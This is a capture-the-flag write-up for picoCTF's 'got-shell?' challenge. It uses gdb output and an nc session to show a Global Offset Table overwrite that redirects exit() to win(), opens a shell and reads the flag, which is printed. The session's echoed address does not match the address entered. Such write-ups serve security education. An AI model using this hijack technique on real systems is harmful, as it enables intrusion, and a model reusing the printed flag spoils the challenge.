# got-shell?
Binary Exploitation - 350 points

## Challenge 
> Can you authenticate to this [service](auth) and get the flag? Connect to it with nc 2018shell2.picoctf.com 3582. [Source](auth.c)


## Hint
> Ever heard of the Global Offset Table?


## Solution

Really good resource

- http://www.infosecwriters.com/text_resources/pdf/GOT_Hijack.pdf

---

Basically we override the GOT entry to allow us to jump into `win()`. A convenient one is to override the entry for `exit()`

First, find the address jumped to
	
	(gdb) disas main
	...
	   0x0804863b <+215>:	push   %eax
	   0x0804863c <+216>:	call   0x80483d0 <puts@plt>
	   0x08048641 <+221>:	add    $0x10,%esp
	   0x08048644 <+224>:	mov    -0x114(%ebp),%eax
	   0x0804864a <+230>:	mov    %eax,%edx
	   0x0804864c <+232>:	mov    -0x110(%ebp),%eax
	   0x08048652 <+238>:	mov    %eax,(%edx)
	   0x08048654 <+240>:	sub    $0xc,%esp
	   0x08048657 <+243>:	push   $0x80487ac
	   0x0804865c <+248>:	call   0x80483d0 <puts@plt>
	   0x08048661 <+253>:	add    $0x10,%esp
	   0x08048664 <+256>:	sub    $0xc,%esp
	   0x08048667 <+259>:	push   $0x1
	   0x08048669 <+261>:	call   0x80483f0 <exit@plt>
	End of assembler dump.

Here we can see that the address of `exit()` is at `0x80483f0`
	   
	   0x08048669 <+261>:	call   0x80483f0 <exit@plt>

We then look at the address it is jumping to...

	(gdb) x/i 0x80483f0
	   0x80483f0 <exit@plt>:	jmp    *0x804a014

Now, we need to override it with the address of `win()`

	(gdb) p win
	$1 = {<text variable, no debug info>} 0x804854b <win>

## Flag

	$ nc 2018shell2.picoctf.com 3582
	I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?
	0x804a014
	Okay, now what value would you like to write to 0x804a00c
	0x804854b
	Okay, writing 0x804854b to 0x804a00c

	ls
		auth
		auth.c
		flag.txt
		xinet_startup.sh
	cat flag.txt
		picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_d3c1afdd}
